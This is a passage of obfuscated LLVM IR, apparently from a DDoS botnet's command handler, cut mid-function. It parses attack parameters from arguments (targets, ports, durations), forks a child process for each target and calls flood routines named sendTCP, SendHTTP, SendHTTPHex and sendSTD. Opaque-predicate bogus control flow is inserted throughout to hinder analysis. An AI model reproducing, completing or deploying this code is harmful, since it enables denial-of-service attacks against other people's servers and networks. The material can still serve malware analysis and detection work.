  br i1 %543, label %594, label %544

; <label>:544:                                    ; preds = %538
  %545 = load i32, i32* @x.93
  %546 = load i32, i32* @y.94
  %547 = sub i32 %545, 1
  %548 = mul i32 %545, %547
  %549 = urem i32 %548, 2
  %550 = icmp eq i32 %549, 0
  %551 = icmp slt i32 %546, 10
  %552 = or i1 %550, %551
  br i1 %552, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %544
  %553 = load i32, i32* %3, align 4
  %554 = icmp sgt i32 %553, 6
  %555 = load i32, i32* @x.93
  %556 = load i32, i32* @y.94
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %554, label %563, label %569

; <label>:563:                                    ; preds = %originalBBpart272
  %564 = load i8**, i8*** %4, align 8
  %565 = getelementptr inbounds i8*, i8** %564, i64 6
  %566 = load i8*, i8** %565, align 8
  %567 = call i32 @atoi(i8* %566) #9
  %568 = icmp slt i32 %567, 0
  br i1 %568, label %594, label %569

; <label>:569:                                    ; preds = %563, %originalBBpart272
  %570 = load i32, i32* %3, align 4
  %571 = icmp eq i32 %570, 8
  br i1 %571, label %572, label %595

; <label>:572:                                    ; preds = %569
  %573 = load i32, i32* @x.93
  %574 = load i32, i32* @y.94
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %572
  %581 = load i8**, i8*** %4, align 8
  %582 = getelementptr inbounds i8*, i8** %581, i64 7
  %583 = load i8*, i8** %582, align 8
  %584 = call i32 @atoi(i8* %583) #9
  %585 = icmp slt i32 %584, 1
  %586 = load i32, i32* @x.93
  %587 = load i32, i32* @y.94
  %588 = sub i32 %586, 1
  %589 = mul i32 %586, %588
  %590 = urem i32 %589, 2
  %591 = icmp eq i32 %590, 0
  %592 = icmp slt i32 %587, 10
  %593 = or i1 %591, %592
  br i1 %593, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %585, label %594, label %595

; <label>:594:                                    ; preds = %originalBBpart276, %563, %538, %532, %526, %520, %originalBBpart268
  br label %1171

; <label>:595:                                    ; preds = %originalBBpart276, %569
  %596 = load i32, i32* @x.93
  %597 = load i32, i32* @y.94
  %598 = sub i32 %596, 1
  %599 = mul i32 %596, %598
  %600 = urem i32 %599, 2
  %601 = icmp eq i32 %600, 0
  %602 = icmp slt i32 %597, 10
  %603 = or i1 %601, %602
  br i1 %603, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %595
  %604 = load i8**, i8*** %4, align 8
  %605 = getelementptr inbounds i8*, i8** %604, i64 1
  %606 = load i8*, i8** %605, align 8
  store i8* %606, i8** %17, align 8
  %607 = load i8**, i8*** %4, align 8
  %608 = getelementptr inbounds i8*, i8** %607, i64 2
  %609 = load i8*, i8** %608, align 8
  %610 = call i32 @atoi(i8* %609) #9
  store i32 %610, i32* %18, align 4
  %611 = load i8**, i8*** %4, align 8
  %612 = getelementptr inbounds i8*, i8** %611, i64 3
  %613 = load i8*, i8** %612, align 8
  %614 = call i32 @atoi(i8* %613) #9
  store i32 %614, i32* %19, align 4
  %615 = load i8**, i8*** %4, align 8
  %616 = getelementptr inbounds i8*, i8** %615, i64 4
  %617 = load i8*, i8** %616, align 8
  %618 = call i32 @atoi(i8* %617) #9
  store i32 %618, i32* %20, align 4
  %619 = load i8**, i8*** %4, align 8
  %620 = getelementptr inbounds i8*, i8** %619, i64 5
  %621 = load i8*, i8** %620, align 8
  store i8* %621, i8** %21, align 8
  %622 = load i32, i32* %3, align 4
  %623 = icmp eq i32 %622, 8
  %624 = load i32, i32* @x.93
  %625 = load i32, i32* @y.94
  %626 = sub i32 %624, 1
  %627 = mul i32 %624, %626
  %628 = urem i32 %627, 2
  %629 = icmp eq i32 %628, 0
  %630 = icmp slt i32 %625, 10
  %631 = or i1 %629, %630
  br i1 %631, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %623, label %632, label %653

; <label>:632:                                    ; preds = %originalBBpart280
  %633 = load i32, i32* @x.93
  %634 = load i32, i32* @y.94
  %635 = sub i32 %633, 1
  %636 = mul i32 %633, %635
  %637 = urem i32 %636, 2
  %638 = icmp eq i32 %637, 0
  %639 = icmp slt i32 %634, 10
  %640 = or i1 %638, %639
  br i1 %640, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %632
  %641 = load i8**, i8*** %4, align 8
  %642 = getelementptr inbounds i8*, i8** %641, i64 7
  %643 = load i8*, i8** %642, align 8
  %644 = call i32 @atoi(i8* %643) #9
  %645 = load i32, i32* @x.93
  %646 = load i32, i32* @y.94
  %647 = sub i32 %645, 1
  %648 = mul i32 %645, %647
  %649 = urem i32 %648, 2
  %650 = icmp eq i32 %649, 0
  %651 = icmp slt i32 %646, 10
  %652 = or i1 %650, %651
  br i1 %652, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %670

; <label>:653:                                    ; preds = %originalBBpart280
  %654 = load i32, i32* @x.93
  %655 = load i32, i32* @y.94
  %656 = sub i32 %654, 1
  %657 = mul i32 %654, %656
  %658 = urem i32 %657, 2
  %659 = icmp eq i32 %658, 0
  %660 = icmp slt i32 %655, 10
  %661 = or i1 %659, %660
  br i1 %661, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %653
  %662 = load i32, i32* @x.93
  %663 = load i32, i32* @y.94
  %664 = sub i32 %662, 1
  %665 = mul i32 %662, %664
  %666 = urem i32 %665, 2
  %667 = icmp eq i32 %666, 0
  %668 = icmp slt i32 %663, 10
  %669 = or i1 %667, %668
  br i1 %669, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %670

; <label>:670:                                    ; preds = %originalBBpart288, %originalBBpart284
  %671 = phi i32 [ %644, %originalBBpart284 ], [ 10, %originalBBpart288 ]
  store i32 %671, i32* %22, align 4
  %672 = load i32, i32* %3, align 4
  %673 = icmp sgt i32 %672, 6
  br i1 %673, label %674, label %695

; <label>:674:                                    ; preds = %670
  %675 = load i32, i32* @x.93
  %676 = load i32, i32* @y.94
  %677 = sub i32 %675, 1
  %678 = mul i32 %675, %677
  %679 = urem i32 %678, 2
  %680 = icmp eq i32 %679, 0
  %681 = icmp slt i32 %676, 10
  %682 = or i1 %680, %681
  br i1 %682, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %674
  %683 = load i8**, i8*** %4, align 8
  %684 = getelementptr inbounds i8*, i8** %683, i64 6
  %685 = load i8*, i8** %684, align 8
  %686 = call i32 @atoi(i8* %685) #9
  %687 = load i32, i32* @x.93
  %688 = load i32, i32* @y.94
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %712

; <label>:695:                                    ; preds = %670
  %696 = load i32, i32* @x.93
  %697 = load i32, i32* @y.94
  %698 = sub i32 %696, 1
  %699 = mul i32 %696, %698
  %700 = urem i32 %699, 2
  %701 = icmp eq i32 %700, 0
  %702 = icmp slt i32 %697, 10
  %703 = or i1 %701, %702
  br i1 %703, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %695
  %704 = load i32, i32* @x.93
  %705 = load i32, i32* @y.94
  %706 = sub i32 %704, 1
  %707 = mul i32 %704, %706
  %708 = urem i32 %707, 2
  %709 = icmp eq i32 %708, 0
  %710 = icmp slt i32 %705, 10
  %711 = or i1 %709, %710
  br i1 %711, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %712

; <label>:712:                                    ; preds = %originalBBpart296, %originalBBpart292
  %713 = phi i32 [ %686, %originalBBpart292 ], [ 0, %originalBBpart296 ]
  store i32 %713, i32* %23, align 4
  %714 = load i8*, i8** %17, align 8
  %715 = call i8* @strstr(i8* %714, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %716 = icmp ne i8* %715, null
  br i1 %716, label %717, label %769

; <label>:717:                                    ; preds = %712
  %718 = load i8*, i8** %17, align 8
  %719 = call i8* @strtok(i8* %718, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %719, i8** %24, align 8
  br label %720

; <label>:720:                                    ; preds = %originalBBpart2104, %717
  %721 = load i8*, i8** %24, align 8
  %722 = icmp ne i8* %721, null
  br i1 %722, label %723, label %768

; <label>:723:                                    ; preds = %720
  %724 = call i32 @listFork()
  %725 = icmp ne i32 %724, 0
  br i1 %725, label %750, label %726

; <label>:726:                                    ; preds = %723
  %727 = load i32, i32* @x.93
  %728 = load i32, i32* @y.94
  %729 = sub i32 %727, 1
  %730 = mul i32 %727, %729
  %731 = urem i32 %730, 2
  %732 = icmp eq i32 %731, 0
  %733 = icmp slt i32 %728, 10
  %734 = or i1 %732, %733
  br i1 %734, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %726
  %735 = load i8*, i8** %24, align 8
  %736 = load i32, i32* %18, align 4
  %737 = load i32, i32* %19, align 4
  %738 = load i32, i32* %20, align 4
  %739 = load i8*, i8** %21, align 8
  %740 = load i32, i32* %23, align 4
  %741 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %735, i32 %736, i32 %737, i32 %738, i8* %739, i32 %740, i32 %741)
  call void @_exit(i32 0) #12
  %742 = load i32, i32* @x.93
  %743 = load i32, i32* @y.94
  %744 = sub i32 %742, 1
  %745 = mul i32 %742, %744
  %746 = urem i32 %745, 2
  %747 = icmp eq i32 %746, 0
  %748 = icmp slt i32 %743, 10
  %749 = or i1 %747, %748
  br i1 %749, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  unreachable

; <label>:750:                                    ; preds = %723
  %751 = load i32, i32* @x.93
  %752 = load i32, i32* @y.94
  %753 = sub i32 %751, 1
  %754 = mul i32 %751, %753
  %755 = urem i32 %754, 2
  %756 = icmp eq i32 %755, 0
  %757 = icmp slt i32 %752, 10
  %758 = or i1 %756, %757
  br i1 %758, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %750
  %759 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %759, i8** %24, align 8
  %760 = load i32, i32* @x.93
  %761 = load i32, i32* @y.94
  %762 = sub i32 %760, 1
  %763 = mul i32 %760, %762
  %764 = urem i32 %763, 2
  %765 = icmp eq i32 %764, 0
  %766 = icmp slt i32 %761, 10
  %767 = or i1 %765, %766
  br i1 %767, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %720

; <label>:768:                                    ; preds = %720
  br label %781

; <label>:769:                                    ; preds = %712
  %770 = call i32 @listFork()
  %771 = icmp ne i32 %770, 0
  br i1 %771, label %780, label %772

; <label>:772:                                    ; preds = %769
  %773 = load i8*, i8** %17, align 8
  %774 = load i32, i32* %18, align 4
  %775 = load i32, i32* %19, align 4
  %776 = load i32, i32* %20, align 4
  %777 = load i8*, i8** %21, align 8
  %778 = load i32, i32* %23, align 4
  %779 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %773, i32 %774, i32 %775, i32 %776, i8* %777, i32 %778, i32 %779)
  call void @_exit(i32 0) #12
  unreachable

; <label>:780:                                    ; preds = %769
  br label %781

; <label>:781:                                    ; preds = %780, %768
  br label %782

; <label>:782:                                    ; preds = %781, %originalBBpart264
  %783 = load i8**, i8*** %4, align 8
  %784 = getelementptr inbounds i8*, i8** %783, i64 0
  %785 = load i8*, i8** %784, align 8
  %786 = call i32 @strcmp(i8* %785, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.157, i32 0, i32 0)) #9
  %787 = icmp ne i32 %786, 0
  br i1 %787, label %863, label %788

; <label>:788:                                    ; preds = %782
  %789 = load i32, i32* @x.93
  %790 = load i32, i32* @y.94
  %791 = sub i32 %789, 1
  %792 = mul i32 %789, %791
  %793 = urem i32 %792, 2
  %794 = icmp eq i32 %793, 0
  %795 = icmp slt i32 %790, 10
  %796 = or i1 %794, %795
  br i1 %796, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %788
  %797 = load i32, i32* %3, align 4
  %798 = icmp slt i32 %797, 6
  %799 = load i32, i32* @x.93
  %800 = load i32, i32* @y.94
  %801 = sub i32 %799, 1
  %802 = mul i32 %799, %801
  %803 = urem i32 %802, 2
  %804 = icmp eq i32 %803, 0
  %805 = icmp slt i32 %800, 10
  %806 = or i1 %804, %805
  br i1 %806, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %798, label %819, label %807

; <label>:807:                                    ; preds = %originalBBpart2108
  %808 = load i8**, i8*** %4, align 8
  %809 = getelementptr inbounds i8*, i8** %808, i64 3
  %810 = load i8*, i8** %809, align 8
  %811 = call i32 @atoi(i8* %810) #9
  %812 = icmp slt i32 %811, 1
  br i1 %812, label %819, label %813

; <label>:813:                                    ; preds = %807
  %814 = load i8**, i8*** %4, align 8
  %815 = getelementptr inbounds i8*, i8** %814, i64 5
  %816 = load i8*, i8** %815, align 8
  %817 = call i32 @atoi(i8* %816) #9
  %818 = icmp slt i32 %817, 1
  br i1 %818, label %819, label %820

; <label>:819:                                    ; preds = %813, %807, %originalBBpart2108
  br label %1171

; <label>:820:                                    ; preds = %813
  %821 = call i32 @listFork()
  %822 = icmp ne i32 %821, 0
  br i1 %822, label %823, label %824

; <label>:823:                                    ; preds = %820
  br label %1171

; <label>:824:                                    ; preds = %820
  %825 = load i32, i32* @x.93
  %826 = load i32, i32* @y.94
  %827 = sub i32 %825, 1
  %828 = mul i32 %825, %827
  %829 = urem i32 %828, 2
  %830 = icmp eq i32 %829, 0
  %831 = icmp slt i32 %826, 10
  %832 = or i1 %830, %831
  br i1 %832, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %824
  %833 = load i8**, i8*** %4, align 8
  %834 = getelementptr inbounds i8*, i8** %833, i64 1
  %835 = load i8*, i8** %834, align 8
  %836 = load i8**, i8*** %4, align 8
  %837 = getelementptr inbounds i8*, i8** %836, i64 2
  %838 = load i8*, i8** %837, align 8
  %839 = load i8**, i8*** %4, align 8
  %840 = getelementptr inbounds i8*, i8** %839, i64 3
  %841 = load i8*, i8** %840, align 8
  %842 = call i32 @atoi(i8* %841) #9
  %843 = trunc i32 %842 to i16
  %844 = load i8**, i8*** %4, align 8
  %845 = getelementptr inbounds i8*, i8** %844, i64 4
  %846 = load i8*, i8** %845, align 8
  %847 = load i8**, i8*** %4, align 8
  %848 = getelementptr inbounds i8*, i8** %847, i64 5
  %849 = load i8*, i8** %848, align 8
  %850 = call i32 @atoi(i8* %849) #9
  %851 = load i8**, i8*** %4, align 8
  %852 = getelementptr inbounds i8*, i8** %851, i64 6
  %853 = load i8*, i8** %852, align 8
  %854 = call i32 @atoi(i8* %853) #9
  call void @SendHTTP(i8* %835, i8* %838, i16 zeroext %843, i8* %846, i32 %850, i32 %854)
  call void @exit(i32 0) #11
  %855 = load i32, i32* @x.93
  %856 = load i32, i32* @y.94
  %857 = sub i32 %855, 1
  %858 = mul i32 %855, %857
  %859 = urem i32 %858, 2
  %860 = icmp eq i32 %859, 0
  %861 = icmp slt i32 %856, 10
  %862 = or i1 %860, %861
  br i1 %862, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  unreachable

; <label>:863:                                    ; preds = %782
  %864 = load i8**, i8*** %4, align 8
  %865 = getelementptr inbounds i8*, i8** %864, i64 0
  %866 = load i8*, i8** %865, align 8
  %867 = call i32 @strcmp(i8* %866, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.158, i32 0, i32 0)) #9
  %868 = icmp ne i32 %867, 0
  br i1 %868, label %944, label %869

; <label>:869:                                    ; preds = %863
  %870 = load i32, i32* %3, align 4
  %871 = icmp slt i32 %870, 6
  br i1 %871, label %884, label %872

; <label>:872:                                    ; preds = %869
  %873 = load i8**, i8*** %4, align 8
  %874 = getelementptr inbounds i8*, i8** %873, i64 3
  %875 = load i8*, i8** %874, align 8
  %876 = call i32 @atoi(i8* %875) #9
  %877 = icmp slt i32 %876, 1
  br i1 %877, label %884, label %878

; <label>:878:                                    ; preds = %872
  %879 = load i8**, i8*** %4, align 8
  %880 = getelementptr inbounds i8*, i8** %879, i64 5
  %881 = load i8*, i8** %880, align 8
  %882 = call i32 @atoi(i8* %881) #9
  %883 = icmp slt i32 %882, 1
  br i1 %883, label %884, label %901

; <label>:884:                                    ; preds = %878, %872, %869
  %885 = load i32, i32* @x.93
  %886 = load i32, i32* @y.94
  %887 = sub i32 %885, 1
  %888 = mul i32 %885, %887
  %889 = urem i32 %888, 2
  %890 = icmp eq i32 %889, 0
  %891 = icmp slt i32 %886, 10
  %892 = or i1 %890, %891
  br i1 %892, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %884
  %893 = load i32, i32* @x.93
  %894 = load i32, i32* @y.94
  %895 = sub i32 %893, 1
  %896 = mul i32 %893, %895
  %897 = urem i32 %896, 2
  %898 = icmp eq i32 %897, 0
  %899 = icmp slt i32 %894, 10
  %900 = or i1 %898, %899
  br i1 %900, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %1171

; <label>:901:                                    ; preds = %878
  %902 = call i32 @listFork()
  %903 = icmp ne i32 %902, 0
  br i1 %903, label %904, label %905

; <label>:904:                                    ; preds = %901
  br label %1171

; <label>:905:                                    ; preds = %901
  %906 = load i32, i32* @x.93
  %907 = load i32, i32* @y.94
  %908 = sub i32 %906, 1
  %909 = mul i32 %906, %908
  %910 = urem i32 %909, 2
  %911 = icmp eq i32 %910, 0
  %912 = icmp slt i32 %907, 10
  %913 = or i1 %911, %912
  br i1 %913, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %905
  %914 = load i8**, i8*** %4, align 8
  %915 = getelementptr inbounds i8*, i8** %914, i64 1
  %916 = load i8*, i8** %915, align 8
  %917 = load i8**, i8*** %4, align 8
  %918 = getelementptr inbounds i8*, i8** %917, i64 2
  %919 = load i8*, i8** %918, align 8
  %920 = load i8**, i8*** %4, align 8
  %921 = getelementptr inbounds i8*, i8** %920, i64 3
  %922 = load i8*, i8** %921, align 8
  %923 = call i32 @atoi(i8* %922) #9
  %924 = trunc i32 %923 to i16
  %925 = load i8**, i8*** %4, align 8
  %926 = getelementptr inbounds i8*, i8** %925, i64 4
  %927 = load i8*, i8** %926, align 8
  %928 = load i8**, i8*** %4, align 8
  %929 = getelementptr inbounds i8*, i8** %928, i64 5
  %930 = load i8*, i8** %929, align 8
  %931 = call i32 @atoi(i8* %930) #9
  %932 = load i8**, i8*** %4, align 8
  %933 = getelementptr inbounds i8*, i8** %932, i64 6
  %934 = load i8*, i8** %933, align 8
  %935 = call i32 @atoi(i8* %934) #9
  call void @SendHTTPHex(i8* %916, i8* %919, i16 zeroext %924, i8* %927, i32 %931, i32 %935)
  call void @exit(i32 0) #11
  %936 = load i32, i32* @x.93
  %937 = load i32, i32* @y.94
  %938 = sub i32 %936, 1
  %939 = mul i32 %936, %938
  %940 = urem i32 %939, 2
  %941 = icmp eq i32 %940, 0
  %942 = icmp slt i32 %937, 10
  %943 = or i1 %941, %942
  br i1 %943, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  unreachable

; <label>:944:                                    ; preds = %863
  %945 = load i32, i32* @x.93
  %946 = load i32, i32* @y.94
  %947 = sub i32 %945, 1
  %948 = mul i32 %945, %947
  %949 = urem i32 %948, 2
  %950 = icmp eq i32 %949, 0
  %951 = icmp slt i32 %946, 10
  %952 = or i1 %950, %951
  br i1 %952, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %944
  %953 = load i8**, i8*** %4, align 8
  %954 = getelementptr inbounds i8*, i8** %953, i64 0
  %955 = load i8*, i8** %954, align 8
  %956 = call i32 @strcmp(i8* %955, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.159, i32 0, i32 0)) #9
  %957 = icmp ne i32 %956, 0
  %958 = load i32, i32* @x.93
  %959 = load i32, i32* @y.94
  %960 = sub i32 %958, 1
  %961 = mul i32 %958, %960
  %962 = urem i32 %961, 2
  %963 = icmp eq i32 %962, 0
  %964 = icmp slt i32 %959, 10
  %965 = or i1 %963, %964
  br i1 %965, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %957, label %1118, label %966

; <label>:966:                                    ; preds = %originalBBpart2124
  %967 = load i32, i32* @x.93
  %968 = load i32, i32* @y.94
  %969 = sub i32 %967, 1
  %970 = mul i32 %967, %969
  %971 = urem i32 %970, 2
  %972 = icmp eq i32 %971, 0
  %973 = icmp slt i32 %968, 10
  %974 = or i1 %972, %973
  br i1 %974, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %966
  %975 = load i32, i32* %3, align 4
  %976 = icmp slt i32 %975, 4
  %977 = load i32, i32* @x.93
  %978 = load i32, i32* @y.94
  %979 = sub i32 %977, 1
  %980 = mul i32 %977, %979
  %981 = urem i32 %980, 2
  %982 = icmp eq i32 %981, 0
  %983 = icmp slt i32 %978, 10
  %984 = or i1 %982, %983
  br i1 %984, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %976, label %1013, label %985

; <label>:985:                                    ; preds = %originalBBpart2128
  %986 = load i8**, i8*** %4, align 8
  %987 = getelementptr inbounds i8*, i8** %986, i64 2
  %988 = load i8*, i8** %987, align 8
  %989 = call i32 @atoi(i8* %988) #9
  %990 = icmp slt i32 %989, 1
  br i1 %990, label %1013, label %991

; <label>:991:                                    ; preds = %985
  %992 = load i32, i32* @x.93
  %993 = load i32, i32* @y.94
  %994 = sub i32 %992, 1
  %995 = mul i32 %992, %994
  %996 = urem i32 %995, 2
  %997 = icmp eq i32 %996, 0
  %998 = icmp slt i32 %993, 10
  %999 = or i1 %997, %998
  br i1 %999, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %991
  %1000 = load i8**, i8*** %4, align 8
  %1001 = getelementptr inbounds i8*, i8** %1000, i64 3
  %1002 = load i8*, i8** %1001, align 8
  %1003 = call i32 @atoi(i8* %1002) #9
  %1004 = icmp slt i32 %1003, 1
  %1005 = load i32, i32* @x.93
  %1006 = load i32, i32* @y.94
  %1007 = sub i32 %1005, 1
  %1008 = mul i32 %1005, %1007
  %1009 = urem i32 %1008, 2
  %1010 = icmp eq i32 %1009, 0
  %1011 = icmp slt i32 %1006, 10
  %1012 = or i1 %1010, %1011
  br i1 %1012, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %1004, label %1013, label %1030

; <label>:1013:                                   ; preds = %originalBBpart2132, %985, %originalBBpart2128
  %1014 = load i32, i32* @x.93
  %1015 = load i32, i32* @y.94
  %1016 = sub i32 %1014, 1
  %1017 = mul i32 %1014, %1016
  %1018 = urem i32 %1017, 2
  %1019 = icmp eq i32 %1018, 0
  %1020 = icmp slt i32 %1015, 10
  %1021 = or i1 %1019, %1020
  br i1 %1021, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1013
  %1022 = load i32, i32* @x.93
  %1023 = load i32, i32* @y.94
  %1024 = sub i32 %1022, 1
  %1025 = mul i32 %1022, %1024
  %1026 = urem i32 %1025, 2
  %1027 = icmp eq i32 %1026, 0
  %1028 = icmp slt i32 %1023, 10
  %1029 = or i1 %1027, %1028
  br i1 %1029, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %1171

; <label>:1030:                                   ; preds = %originalBBpart2132
  %1031 = load i8**, i8*** %4, align 8
  %1032 = getelementptr inbounds i8*, i8** %1031, i64 1
  %1033 = load i8*, i8** %1032, align 8
  store i8* %1033, i8** %25, align 8
  %1034 = load i8**, i8*** %4, align 8
  %1035 = getelementptr inbounds i8*, i8** %1034, i64 2
  %1036 = load i8*, i8** %1035, align 8
  %1037 = call i32 @atoi(i8* %1036) #9
  store i32 %1037, i32* %26, align 4
  %1038 = load i8**, i8*** %4, align 8
  %1039 = getelementptr inbounds i8*, i8** %1038, i64 3
  %1040 = load i8*, i8** %1039, align 8
  %1041 = call i32 @atoi(i8* %1040) #9
  store i32 %1041, i32* %27, align 4
  %1042 = load i8*, i8** %25, align 8
  %1043 = call i8* @strstr(i8* %1042, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %1044 = icmp ne i8* %1043, null
  br i1 %1044, label %1045, label %1093

; <label>:1045:                                   ; preds = %1030
  %1046 = load i8*, i8** %25, align 8
  %1047 = call i8* @strtok(i8* %1046, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %1047, i8** %28, align 8
  br label %1048

; <label>:1048:                                   ; preds = %originalBBpart2140, %1045
  %1049 = load i8*, i8** %28, align 8
  %1050 = icmp ne i8* %1049, null
  br i1 %1050, label %1051, label %1076

; <label>:1051:                                   ; preds = %1048
  %1052 = call i32 @listFork()
  %1053 = icmp ne i32 %1052, 0
  br i1 %1053, label %1058, label %1054

; <label>:1054:                                   ; preds = %1051
  %1055 = load i8*, i8** %28, align 8
  %1056 = load i32, i32* %26, align 4
  %1057 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %1055, i32 %1056, i32 %1057)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1058:                                   ; preds = %1051
  %1059 = load i32, i32* @x.93
  %1060 = load i32, i32* @y.94
  %1061 = sub i32 %1059, 1
  %1062 = mul i32 %1059, %1061
  %1063 = urem i32 %1062, 2
  %1064 = icmp eq i32 %1063, 0
  %1065 = icmp slt i32 %1060, 10
  %1066 = or i1 %1064, %1065
  br i1 %1066, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1058
  %1067 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %1067, i8** %28, align 8
  %1068 = load i32, i32* @x.93
  %1069 = load i32, i32* @y.94
  %1070 = sub i32 %1068, 1
  %1071 = mul i32 %1068, %1070
  %1072 = urem i32 %1071, 2
  %1073 = icmp eq i32 %1072, 0
  %1074 = icmp slt i32 %1069, 10
  %1075 = or i1 %1073, %1074
  br i1 %1075, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1048

; <label>:1076:                                   ; preds = %1048
  %1077 = load i32, i32* @x.93
  %1078 = load i32, i32* @y.94
  %1079 = sub i32 %1077, 1
  %1080 = mul i32 %1077, %1079
  %1081 = urem i32 %1080, 2
  %1082 = icmp eq i32 %1081, 0
  %1083 = icmp slt i32 %1078, 10
  %1084 = or i1 %1082, %1083
  br i1 %1084, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1076
  %1085 = load i32, i32* @x.93
  %1086 = load i32, i32* @y.94
  %1087 = sub i32 %1085, 1
  %1088 = mul i32 %1085, %1087
  %1089 = urem i32 %1088, 2
  %1090 = icmp eq i32 %1089, 0
  %1091 = icmp slt i32 %1086, 10
  %1092 = or i1 %1090, %1091
  br i1 %1092, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1101

; <label>:1093:                                   ; preds = %1030
  %1094 = call i32 @listFork()
  %1095 = icmp ne i32 %1094, 0
  br i1 %1095, label %1096, label %1097

; <label>:1096:                                   ; preds = %1093
  br label %1171

; <label>:1097:                                   ; preds = %1093
  %1098 = load i8*, i8** %25, align 8
  %1099 = load i32, i32* %26, align 4
  %1100 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %1098, i32 %1099, i32 %1100)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1101:                                   ; preds = %originalBBpart2144
  %1102 = load i32, i32* @x.93
  %1103 = load i32, i32* @y.94
  %1104 = sub i32 %1102, 1
  %1105 = mul i32 %1102, %1104
  %1106 = urem i32 %1105, 2
  %1107 = icmp eq i32 %1106, 0
  %1108 = icmp slt i32 %1103, 10
  %1109 = or i1 %1107, %1108
  br i1 %1109, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1101
  %1110 = load i32, i32* @x.93
  %1111 = load i32, i32* @y.94
  %1112 = sub i32 %1110, 1
  %1113 = mul i32 %1110, %1112
  %1114 = urem i32 %1113, 2
